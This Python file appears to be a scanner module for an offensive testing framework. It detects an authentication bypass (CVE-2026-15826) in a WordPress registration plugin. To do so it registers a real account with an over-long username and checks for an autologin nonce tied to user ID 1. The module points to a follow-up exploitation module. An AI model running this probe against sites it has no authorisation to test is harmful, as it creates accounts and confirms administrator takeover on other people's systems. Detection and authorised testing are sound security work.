#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Profile Builder 3.16.4 autologin bypass (CVE-2026-15826)."""

import re
import secrets
import string

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "profile-builder"


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Profile Builder CVE-2026-15826 detect",
        "description": (
            "Detects CVE-2026-15826: 61+ char username triggers absint(WP_Error)→1 autologin nonce."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-15826",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-15826"],
        "modules": ["auxiliary/admin/http/profile_builder_cve_2026_15826_autologin"],
        "tags": ["web", "scanner", "wordpress", "profile-builder", "auth-bypass", "cve-2026-15826"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/profile_builder_cve_2026_15826_autologin"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    register_path = OptString("/register/", "Registration page", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version:
            parts = Wordpress.wp_version_to_tuple(version)
            if parts[:3] != (3, 16, 4):
                return False
        reg = self._join((self.register_path or "/register/").strip())
        page = self.http_request(method="GET", path=reg, allow_redirects=True)
        if not page or "wppb-register-user" not in (page.text or ""):
            return False
        html = page.text or ""
        form_m = re.search(r'name="form_name"[^>]*value="([^"]*)"', html)
        nonce_m = re.search(r'name="register_[^"]*_nonce_field"[^>]*value="([^"]+)"', html)
        if not form_m or not nonce_m:
            self.set_info(severity="high", reason="Profile Builder register form present", cve="CVE-2026-15826")
            return True
        letters = string.ascii_lowercase
        user = "".join(secrets.choice(letters) for _ in range(63))
        email = f"{secrets.token_hex(4)}@example.test"
        pwd = f"Pb{secrets.token_hex(4)}Aa1!"
        post = self.http_request(
            method="POST",
            path=reg,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "username": user,
                "email": email,
                "passw1": pwd,
                "passw2": pwd,
                "action": "register",
                "form_name": form_m.group(1),
                f"register_{form_m.group(1)}_nonce_field": nonce_m.group(1),
                "register": "Register",
                "_wp_http_referer": reg.replace(self.wp_normalize_base_path(self.base_path or "/"), "") or "/register/",
            },
            allow_redirects=False,
        )
        body = post.text or "" if post else ""
        auto_m = re.search(r"autologin=true(?:&|&amp;|&#038;)?_wpnonce=([a-f0-9]+)", body)
        if auto_m:
            self.set_info(
                severity="critical",
                reason="Profile Builder autologin nonce issued (user ID 1 bind)",
                path=reg,
                cve="CVE-2026-15826",
            )
            return True
        return False
